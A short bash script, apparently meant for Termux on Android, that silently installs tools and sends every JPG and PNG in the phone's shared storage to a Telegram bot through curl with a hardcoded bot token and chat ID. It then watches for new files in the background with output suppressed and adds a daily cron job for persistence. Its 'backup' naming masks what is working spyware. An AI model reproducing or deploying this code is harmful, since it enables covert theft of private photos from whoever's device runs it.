#!/bin/bash

TOKEN="7678726628:AAFfLP0pv4vrAp5ExyqSOrfYLCX-pPmHzqc"
CHAT_ID="6817886155"
WATCH_DIR="/storage/emulated/0/"
IGNORE_FOLDERS=("Android")

check_inotify() {
    if ! command -v inotifywait &> /dev/null; then
        echo "Install modules...."
        pkg install inotify-tools cronie -y > /dev/null 2>&1
    fi
}

is_ignored() {
    for ignored in "${IGNORE_FOLDERS[@]}"; do
        if [[ "$1" == *"/$ignored/"* ]]; then
            return 0
        fi
    done
    return 1
}

send_file() {
    local file_path="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
        -F chat_id="$CHAT_ID" \
        -F document=@"$file_path" > /dev/null 2>&1
}

backup_files() {
    find "$WATCH_DIR" -iname "*.jpg" -o -iname "*.png" | while read file; do
        if [ -f "$file" ]; then
            if is_ignored "$file"; then
                continue
            fi
            send_file "$file"
        fi
    done
}

monitor_directory() {
    inotifywait -mr -e create --format "%w%f" "$WATCH_DIR" | while read file; do
        if [ -f "$file" ]; then
            if is_ignored "$file"; then
                continue
            fi
            send_file "$file"
        fi
    done
}

cron_backup() {
    (crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash $0 backup") | crontab - > /dev/null 2>&1
}

if [ "$1" == "backup" ]; then
    backup_files
    exit 0
fi

check_inotify
(
    monitor_directory
) > /dev/null 2>&1 &
cron_backup